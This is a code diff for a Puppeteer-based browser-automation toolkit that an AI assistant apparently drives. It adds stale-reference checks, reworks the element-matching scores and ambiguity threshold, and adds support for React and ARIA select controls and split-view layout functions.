+  // New interactives + landmarks (no ref yet) - sweep BOTH like observe() does,
+  // otherwise newly-appeared h1/form/dialog never show up in the appeared list.
+  const NEW_CANDIDATES = 'a[href],button,input,select,textarea,summary,details,[role],[tabindex]:not([tabindex="-1"]),[contenteditable=""],[contenteditable="true"],[onclick],h1,h2,h3,h4,form,nav,main,dialog,[role=region],[role=dialog]';
+  const seenAppeared = new Set();
+  for (const el of document.querySelectorAll(NEW_CANDIDATES)) {
     if (!visible(el)) continue;
     if (el.hasAttribute('data-ccm-ref')) continue;
-    maxRef++;
-    el.setAttribute('data-ccm-ref', String(maxRef));
+    if (seenAppeared.has(el)) continue;
+    seenAppeared.add(el);
+    const ref = nextRef++;
+    el.setAttribute('data-ccm-ref', String(ref));
     const s = compact(el);
-    newSig[maxRef] = s;
+    newSig[ref] = s;
     const name = (el.getAttribute('aria-label') || el.innerText || '').trim().slice(0,120);
-    appeared.push({ ref: maxRef, role: el.getAttribute('role') || el.tagName.toLowerCase(), name });
+    appeared.push({ ref, role: el.getAttribute('role') || el.tagName.toLowerCase(), name });
   }
 
-  window.__ccmObserve = { sig: newSig, ts: Date.now() };
+  window.__ccmObserve = { sig: newSig, ts: Date.now(), nextRef };
   return { changed, appeared, disappeared, refCount: Object.keys(newSig).length };
 })()
 `;
@@ -1435,9 +1744,23 @@ async function _wrapAction(fn, { observe = true, stabilizeMs = 5000, targetId } 
   return { ...result, stabilized: stab, delta };
 }
 
+// Helper: check the ref still resolves to an element in the page. Returns
+// a clear "ref stale" error instead of letting Puppeteer's generic
+// `Error: No element found for selector: [data-ccm-ref="N"]` propagate.
+async function _assertRefAlive(page, ref) {
+  const exists = await page.evaluate(r => !!document.querySelector('[data-ccm-ref="' + r + '"]'), ref);
+  if (!exists) {
+    throw new Error(
+      `ref ${ref} no longer exists — element was removed by a re-render or navigation. ` +
+      `Call chrome_observe (or chrome_observe_delta) again to get fresh refs.`
+    );
+  }
+}
+
 async function clickRef({ ref, observe = true, stabilizeMs = 5000, targetId } = {}) {
   const sel = _refSel(ref);
   return _wrapAction(async (page) => {
+    await _assertRefAlive(page, ref);
     await page.click(sel);
     return { ok: true, clicked: 'selector', target: sel, ref };
   }, { observe, stabilizeMs, targetId });
@@ -1447,16 +1770,19 @@ async function typeRef({ ref, text, submit = false, observe = true, stabilizeMs 
   if (typeof text !== 'string') throw new Error('text required');
   const sel = _refSel(ref);
   return _wrapAction(async (page) => {
-    await page.evaluate((s, val) => {
+    await _assertRefAlive(page, ref);
+    const wrote = await page.evaluate((s, val) => {
       const el = document.querySelector(s);
-      if (!el) return;
+      if (!el) return { ok: false };
       el.focus();
       const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value')
                  || Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, 'value');
       if (setter && setter.set) setter.set.call(el, val); else el.value = val;
       el.dispatchEvent(new Event('input', { bubbles: true }));
       el.dispatchEvent(new Event('change', { bubbles: true }));
+      return { ok: true };
     }, sel, text);
+    if (!wrote.ok) throw new Error(`ref ${ref} disappeared between assert and type — re-observe.`);
     if (submit) await page.keyboard.press('Enter');
     return { ok: true, ref, typed: text.length };
   }, { observe, stabilizeMs, targetId });
@@ -1464,6 +1790,7 @@ async function typeRef({ ref, text, submit = false, observe = true, stabilizeMs 
 
 async function focusRef({ ref, observe = false, stabilizeMs = 1000, targetId } = {}) {
   return _wrapAction(async (page) => {
+    await _assertRefAlive(page, ref);
     await page.focus(_refSel(ref));
     return { ok: true, ref };
   }, { observe, stabilizeMs, targetId });
@@ -1476,18 +1803,30 @@ async function focusRef({ ref, observe = false, stabilizeMs = 1000, targetId } =
 // NL→structured intent; this resolver does name→ref→execute→stabilize→delta in
 // one round-trip. On ambiguous match, refuses and returns top candidates.
 const _STEP_ACTION_ROLES = {
+  // `click` — also includes contenteditable-ish + form submit triggers
   click:  ['button','link','checkbox','radio','menuitem','menuitemcheckbox','menuitemradio','tab','option','switch','treeitem','combobox','summary'],
+  // `type` — includes contenteditable (role often "textbox" via observe's tag map,
+  // but plain <div contenteditable> can come back as "generic"); we also accept
+  // `null`/`generic` IF the node has state including 'editable' (set page-side).
   type:   ['textbox','searchbox','spinbutton','combobox'],
   focus:  null,
+  // `select` accepts both native <select> (role often "combobox" via tag map)
+  // and ARIA listbox/combobox patterns
   select: ['combobox','listbox'],
 };
+
+// Scoring scale (post-fix): exact=100, startsWith=55, includes=40, token=≤30.
+// Filter floor = 15 means token-overlap of ≥1 token is the minimum signal.
+// Ambiguity gap = 20 — two `startsWith` candidates won't both trigger refuse.
+const _STEP_SCORE_FLOOR = 15;
+const _STEP_AMBIG_GAP   = 20;
 
 function _stepScore(node, target, role) {
   const name = (node.name || '').toLowerCase();
   const q = target.toLowerCase().trim();
   let s = 0;
-  if (role && node.role === role) s += 50;
-  else if (role && node.role !== role) s -= 100;
+  // `role` is post-filter: by the time we score, role mismatches are gone.
+  // No more dead +50/-100 branch — keep scoring purely on name signal.
   if (q) {
     if (name === q) s += 100;
     else if (name.startsWith(q)) s += 55;
@@ -1501,8 +1840,6 @@ function _stepScore(node, target, role) {
     }
   }
   if (node.state && node.state.includes('disabled')) s -= 50;
-  // In-viewport bonus
-  if (node.rect && node.rect.y >= 0 && node.rect.y < 4000) s += 2;
   return s;
 }
 
@@ -1540,7 +1877,11 @@ async function step({ action, target, role, value, submit = false, near, observe
       if (nearRefs && nearRefs.has(n.ref)) s += 15;
       return { ref: n.ref, role: n.role, name: n.name, state: n.state, score: s };
     })
-    .filter(n => n.score > 0)
+    // Filter floor = 15: only real name signal survives (token-overlap ≥ 1
+    // hit, includes, startsWith, exact). Previously `> 0` + `+2 viewport
+    // bonus` let EVERY visible role-allowed element through, swamping the
+    // ambiguity gate with garbage candidates.
+    .filter(n => n.score >= _STEP_SCORE_FLOOR)
     .sort((a, b) => b.score - a.score);
 
   if (!scored.length) {
@@ -1553,11 +1894,16 @@ async function step({ action, target, role, value, submit = false, near, observe
   }
   const top = scored[0];
   const runnerUp = scored[1];
-  if (runnerUp && (top.score - runnerUp.score) < 8) {
+  // Ambiguity gap widened from 8 to 20: two `startsWith` candidates (55 each)
+  // no longer trigger refuse just because they tied. A true ambiguity (both
+  // names identical → exact match 100 each, gap 0) still refuses. Caller
+  // disambiguates with `role:` or `near:` and re-calls.
+  if (runnerUp && (top.score - runnerUp.score) < _STEP_AMBIG_GAP) {
     return {
       ok: false,
-      error: 'ambiguous match — pass role or near to disambiguate',
+      error: 'ambiguous match — pass role or near to disambiguate (or re-call with a more specific target)',
       candidates: scored.slice(0, 5),
+      hint: 'each candidate has { ref, role, name, score } — re-call chrome_step with role:<role> or near:<other-text>',
     };
   }
 
@@ -1570,25 +1916,64 @@ async function step({ action, target, role, value, submit = false, near, observe
     result = await focusRef({ ref: top.ref, observe: obs, stabilizeMs, targetId });
   } else if (action === 'select') {
     result = await _wrapAction(async (page) => {
-      await page.evaluate((ref, val) => {
+      const ok = await page.evaluate((ref, val) => {
         const el = document.querySelector('[data-ccm-ref="' + ref + '"]');
-        if (!el) return;
-        // Try matching <option> by value or visible text
+        if (!el) return { ok: false, error: 'ref ' + ref + ' vanished — call chrome_observe again' };
+        // ── Native <select> ────────────────────────────────────────
         if (el.tagName === 'SELECT') {
           let matched = false;
+          let chosenValue = null;
           for (const opt of el.options) {
             if (opt.value === val || (opt.textContent || '').trim() === val) {
-              el.value = opt.value; matched = true; break;
+              chosenValue = opt.value; matched = true; break;
             }
           }
-          if (!matched) el.value = val;
-        } else {
-          el.value = val;
+          if (!matched) chosenValue = val;
+          // React-controlled <select> requires the native value-setter trick;
+          // direct el.value = X gets reverted on next render.
+          const desc = Object.getOwnPropertyDescriptor(HTMLSelectElement.prototype, 'value');
+          if (desc && desc.set) desc.set.call(el, chosenValue);
+          else el.value = chosenValue;
+          el.dispatchEvent(new Event('input',  { bubbles: true }));
+          el.dispatchEvent(new Event('change', { bubbles: true }));
+          return { ok: true, matched, chosen: chosenValue };
         }
-        el.dispatchEvent(new Event('input',  { bubbles: true }));
-        el.dispatchEvent(new Event('change', { bubbles: true }));
+        // ── ARIA listbox / combobox ────────────────────────────────
+        // Find a descendant [role=option] whose visible text or aria-label
+        // matches `val` (case-insensitive). For combobox, the listbox may be
+        // a sibling controlled via aria-controls; search both.
+        const role = el.getAttribute('role');
+        const listRoot = (() => {
+          const owned = el.getAttribute('aria-controls');
+          if (owned) {
+            const r = document.getElementById(owned);
+            if (r) return r;
+          }
+          if (role === 'listbox') return el;
+          // Combobox: option list often opens as a sibling; if not visible
+          // yet, click the combobox to expand first.
+          return el;
+        })();
+        const valLower = String(val).toLowerCase().trim();
+        let opt = null;
+        for (const candidate of listRoot.querySelectorAll('[role=option]')) {
+          const t = (candidate.getAttribute('aria-label') || candidate.textContent || '').trim().toLowerCase();
+          if (t === valLower || candidate.getAttribute('data-value') === val) { opt = candidate; break; }
+        }
+        if (!opt) {
+          // Try expanding combobox first (some patterns require explicit open)
+          if (role === 'combobox' && el.getAttribute('aria-expanded') !== 'true') {
+            el.click();
+          }
+          return { ok: false, error: 'option "' + val + '" not found in [role=option] descendants — combobox may need explicit open' };
+        }
+        opt.click();
+        return { ok: true, matched: true, optionRef: opt.getAttribute('data-ccm-ref') || null };
       }, top.ref, value);
-      return { ok: true, ref: top.ref, selected: value };
+      if (!ok || ok.ok === false) {
+        return { ok: false, ref: top.ref, error: ok?.error || 'select dispatch failed' };
+      }
+      return { ok: true, ref: top.ref, selected: value, ...ok };
     }, { observe: obs, stabilizeMs, targetId });
   }
 
@@ -1962,8 +2347,8 @@ async function consoleSubscribe() {
   _ensureConsoleCapture(page);
   return { ok: true, capturing: true, bufferSize: CONSOLE_MAX };
 }
-async function consoleGetRecent({ limit = 100, clear = false } = {}) {
-  const page = await _activePage();
+async function consoleGetRecent({ limit = 100, clear = false, targetId } = {}) {
+  const page = await _resolvePage(targetId);
   _ensureConsoleCapture(page);
   const buf = _consoleBuffers.get(page) || [];
   const out = buf.slice(-Math.max(1, Math.min(CONSOLE_MAX, limit)));
@@ -2189,7 +2574,9 @@ function extReceiveResult({ id, result }) {
 
 // Queue a job and await the extension's response
 async function _extCall(method, params = {}) {
-  if (!_browser || !_browser.isConnected()) {
+  // Use the Puppeteer-version-safe helper — direct `.isConnected()` throws
+  // "is not a function" on v22+ which dropped the method for a `.connected` prop.
+  if (!_isBrowserAlive()) {
     throw new Error('Chrome is not running. Call chrome_launch first.');
   }
   const id = 'j-' + (_extJobSeq++);
@@ -2295,6 +2682,12 @@ module.exports = {
   // Phase 9 — multi-file batch, open-at-line, save-survivor, picker
   cmEnsureEditor, cmOpenAtLine, cmEditAtomic,
   pickerInstall, pickerCapture, pickerCancel,
+
+  // Phase 15 — split-view state (read-only: tells Claude which CDP target
+  // is the left/right pane so it can drive both via targetId in one turn)
+  splitState,
+  // Phase 16 — Claude controls the split layout itself (no manual button click)
+  splitEnable, splitDisable, splitSwap, splitSetRatio,
 
   // Phase 2 — Network
   networkGetCookies, networkSetCookie, networkDeleteCookies, networkClearAllCookies,
